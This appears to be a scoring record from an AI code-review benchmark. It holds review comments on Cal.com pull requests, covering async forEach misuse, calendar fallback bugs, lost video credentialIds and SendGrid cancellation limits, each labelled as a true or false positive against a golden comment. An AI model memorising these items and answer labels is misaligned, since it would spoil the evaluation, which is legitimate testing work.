The `describe("Caching")` block (previously asserting that `getAuthorizationConditions()` and `getFilterConditions()` return the same cached value on repeated calls) was removed, but the service still implements `cachedAuthConditions` / `cachedFilterConditions` memoization, including the `undefined`-vs-`null` distinction in `getFilterConditions()` (a cached `null` must not trigger a rebuild). With `toEqual` on the `Prisma.Sql` object the `values` arrays are compared element-by-element, so any reordering (e.g. after a vacuum, index-only scan or parallel plan) fails the test even though the generated SQL is semantically equivalent. `appStoreMetadata[app.slug]` assumes the metadata map is keyed by slug, but `@calcom/app-store/appStoreMetaData` is keyed by the app's directory name (e.g. `googlecalendar`, `office365calendar`, `zoomvideo`), which differs from the DB slug (`google-calendar`, `office365-calendar`, `zoom`). When a credential was previously marked `invalid: true` (e.g. Google Calendar's `invalid_grant` handling, or `invalidateCredential` in the Zoom/Webex adapters), the update at lines 73-80 only writes `key`. The credential stays flagged invalid, so Cal.com keeps showing the app as broken and keeps skipping it even though fresh, working tokens were just synced in. The update should also set `invalid: false`.

`process.env.CALCOM_WEBHOOK_SECRET && process.env.CALCOM_APP_CREDENTIAL_ENCRYPTION_KEY` returns the value of `CALCOM_APP_CREDENTIAL_ENCRYPTION_KEY` when both are set, so this exported "flag" actually holds a secret. The refresh call now goes through `refreshOAuthTokens` (so it can hit the credential-sync endpoint), but the response is still validated with `webexRefreshedTokenSchema.safeParse`, which requires `refresh_token`, `refresh_token_expires_in` and a literal `scope`/`token_type`. If a booking is cancelled or rescheduled less than one cron interval before the reminder's send time (e.g. 10 minutes before), the next run happens after `scheduledDate` has passed: the row is deleted by `deleteMany` and the reminder email is delivered. Even when the run lands a few minutes before the send time, SendGrid only honours cancellation of a scheduled send up to ~10 minutes before `send_at`, so the cancel request is rejected. `deleteScheduledEmailReminder(reminder.id, reminder.referenceId, true)` passes `immediateDelete = true` for the reschedule path. The PR's own diagnosis is that immediate `POST /v3/user/scheduled_sends { status: "cancel" }` calls accumulate as pending cancellations and start failing once 100 are pending. Rescheduling is one of the two cases named in the PR title, and it is a high-volume path, so it keeps filling that quota and keeps failing silently (the error is only `console.log`ged in `deleteScheduledEmailReminder`), which both leaves the old reminder scheduled and can push the quota over the limit so that other cancellations (including the cron's) fail too. false_positives.candidate:
Video booking references lose their credentialId

`credentialId: isCalendarType ? result.credentialId : undefined` replaces the previous `isCalendarType ? evt.destinationCalendar?.credentialId : result.credentialId`. For video results (non-calendar) the credentialId coming from `createMeeting` is now discarded, so `BookingReference` rows for `*_video` are stored with `credentialId: null`. handleCancelBooking only deletes the meeting when `bookingVideoReference.credentialId` is set, so cancelling a booking will no longer delete the video meeting; other code paths that resolve the video credential from the reference are affected too. Keep `result.credentialId` for the non-calendar branch.

deleteEvent fallback silently targets "primary" instead of the destination calendar

Same broken lookup as in updateEvent: `event.destinationCalendar?.find((cal) => cal.externalId === externalCalendarId)` can never match when `externalCalendarId` is falsy, so `calendarId` becomes undefined and the code falls back to `"primary"`. Previously the destination calendar's `externalId` was used. When cancelling a booking whose reference lacks `externalCalendarId`, Google will return 404 for the event in `primary` (which the handler swallows), leaving the real event in the user's destination calendar undeleted and the slot blocked.

hangoutLink patch uses possibly-undefined calendarId while insert used "primary"

The insert call now uses `calendarId: selectedCalendar || "primary"`, but the follow-up `calendar.events.patch` (used to rewrite the description with the Meet hangout link) still passes `calendarId: selectedCalendar`. When no destination calendar matches the credential, `selectedCalendar` is undefined, the event was created in `primary`, and the patch request is made with an undefined calendarId — the description never gets the meeting link and the error is unhandled (fire-and-forget promise rejection).

Destination calendars with a null credentialId now fall back to "primary"

`selectedCalendar` is resolved only by `cal.credentialId === credentialId`. `DestinationCalendar.credentialId` is nullable, and EventManager's new else-branch calls `createEvent(c, event)` (no externalId) for exactly those rows, so the find never matches and the event is created in `primary` instead of the configured destination calendar. Combined with `createEvent` being called without `externalId`, the resulting booking reference also has `externalCalendarId: undefined`, which then breaks subsequent update/delete (see the broken fallbacks in updateEvent/deleteEvent). Keep a fallback to the destination calendar's `externalId` when no credentialId match exists.

Team hosts' destination calendars are dropped when there is no primary destination calendar

`evt.destinationCalendar?.push(...teamDestinationCalendars);` is a no-op when `evt.destinationCalendar` is `null`, which is exactly the case when neither the event type nor the organizer has a destination calendar. In that situation a COLLECTIVE event with co-hosts who do have destination calendars will create no host calendar events at all (EventManager then falls into the `cred.type === "calendar"` legacy fallback, which never matches) — i.e. the bug this PR intends to fix is still present for that configuration. Build the array unconditionally (e.g. start from `[]` and push) instead of relying on optional chaining. Note also that when `eventType.destinationCalendar` is set, the organizer's personal calendar is intentionally excluded while every other host's personal calendar is added, which is an inconsistent semantic worth confirming.

destinationCalendar payload shape is inconsistent (null vs [])

handleNewBooking emits `destinationCalendar: null` when no calendar is configured, while every other producer changed in this PR (confirm.handler, handleCancelBooking, webhook.ts, paypal-webhook.ts, bookingReminder.ts, requestReschedule) emits `[]`. The field is forwarded verbatim to webhook subscribers (see apps/web/playwright/webhook.e2e.ts, which now expects `[]` for BOOKING_REJECTED but `null` for BOOKING_CREATED/BOOKING_REQUESTED). This is a breaking payload change for existing webhook/API consumers (object -> array) and it is not even internally consistent; pick one representation and document the breaking change.

Dynamic-booking user query no longer selects `organization.slug`

The rewritten `loadUsers` drops `organization: { select: { slug: true } }` from the dynamic-group `prisma.user.findMany` select that existed before. Any downstream use of `user.organization?.slug` (e.g. computing booker/organization URLs) will now see `undefined` for dynamic bookings, and the two branches of `loadUsers` now return structurally different shapes, which also weakens/breaks the type inference the comment "loadUsers allows type inferring" relies on. Restore the selection or justify its removal.

Error message in updateAllCalendarEvents is computed but never logged

The catch block still builds the diagnostic `message` (including credential type, userId and bookingId) but the `console.error(message)` call was removed in this diff. Failures while updating calendar events now return `success: false` results with no trace in the logs, making reschedule/update failures undiagnosable.

Recurring-event deletion is repeated once per calendar reference

The recurring branch (iterating every user calendar credential × every updated booking reference) is now nested inside the new `for (const reference of bookingCalendarReference)` loop. With N calendar references on the booking, the same set of deleteEvent calls is issued N times, producing N× API calls to every calendar provider and repeated 404/410 responses. The recurring-cancellation block does not depend on `reference` at all and should be hoisted out of the per-reference loop.

No tests for the new multi-destination-calendar behaviour

This PR changes `CalendarEvent.destinationCalendar` from a single object to an array across ~20 files and adds non-trivial branching (per-destination credential resolution with DB fallback, per-reference update/delete loops, collective host calendar aggregation) yet adds no unit/integration tests. The only test change is flipping one e2e expectation from `null` to `[]`, which leaves the other two webhook expectations asserting the old shape. Please add coverage for: collective event with two hosts each having a destination calendar, destination calendar rows with a null credentialId, and cancel/reschedule of a booking with multiple calendar references.

true_positives.matched_candidate:
requestReschedule awaits inside `forEach`, so calendar/video cancellations are unawaited and errors are unhandled

`bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...); ... })` is fire-and-forget: the mutation continues to send the reschedule email, fire webhooks and return while the `deleteEvent`/`deleteMeeting` calls have not even been issued yet (they are now gated behind the awaited `getCalendar`). true_positives.golden_comment: The code uses forEach with async callbacks, which causes asynchronous operations (e.g., calendar/video event deletions, payment refunds) to run concurrently without being awaited. This 'fire-and-forget' behavior leads to unhandled promise rejections, race conditions, and incomplete cleanup, as surrounding try-catch blocks cannot properly handle errors from these unawaited promises. Replace forEach with for...of loops or Promise.all() with map() to ensure proper sequential execution and error handling.
true_positives.matched_candidate:
`forEach(async ...)` makes the surrounding try/catch dead and turns errors into unhandled rejections

The callback passed to `bookingRefsFiltered.forEach` was made `async` so it can `await getCalendar(...)`. `forEach` discards the returned promise, so the enclosing `try { ... } catch (error) { logger.error(...) }` can no longer observe anything that happens inside: previously a synchronous throw from `getCalendar` was caught and logged, now it (and any `deleteEvent`/`deleteMeeting` rejection) escapes as an unhandled promise rejection, which under Node's default unhandled-rejection handling can kill the process. In addition, the remote delete calls are no longer even *issued* before `Reschedule` returns, because they are now behind an `await`, so the calendar/video events may never be cancelled. Use `for (const bookingRef of bookingRefsFiltered) { ... await ... }` inside the existing try/catch, or `await Promise.all(bookingRefsFiltered.map(async ...))`.

false_positives.candidate:
`forEach(async ...)` makes the surrounding try/catch dead and turns errors into unhandled rejections

Same problem as in `vital/lib/reschedule.ts`: the `forEach` callback is now `async`, so the `try/catch` wrapping it (lines 124-139) can never catch a failure of `getCalendar`, `deleteEvent` or `deleteMeeting` – those rejections now surface as unhandled promise rejections instead of being logged. The deletions are also no longer started synchronously, so `Reschedule` can resolve and the request finish before the external calendar/video events are cancelled. Replace with a `for ... of` loop and `await` (or `await Promise.all(map(...))`) inside the try block.

getCalendarCredentials now returns a Promise in `calendar`, changing the contract for all consumers

`getCalendar` became async but line 28 still calls it without awaiting, so each item returned by the exported `getCalendarCredentials` now carries `calendar: Promise<Calendar | null>` instead of `Calendar | null`. Only `getConnectedCalendars` in this file was updated to `await item.calendar`; every other consumer of `getCalendarCredentials` (it is a public export of `@calcom/core`) that touches `.calendar` directly will now operate on a Promise and fail at runtime (`item.calendar.listCalendars is not a function`) unless TypeScript happens to flag it. All call sites need to be audited, or `getCalendarCredentials` should itself become async and resolve the calendars before returning. Related risk: the promises created here are left floating; if a dynamic app import rejects and nobody awaits that item, the rejection is unhandled and can terminate the process.

Template comment points at a non-existent path

The example comment was changed from `// import * as example from "./_example";` to `// example: import("./example"),`. The directory in the repo is `_example`, so a contributor copying this template line will add an import for a path that does not exist and get a build failure. It should read `example: import("./_example")` (matching whatever shape the final map uses).
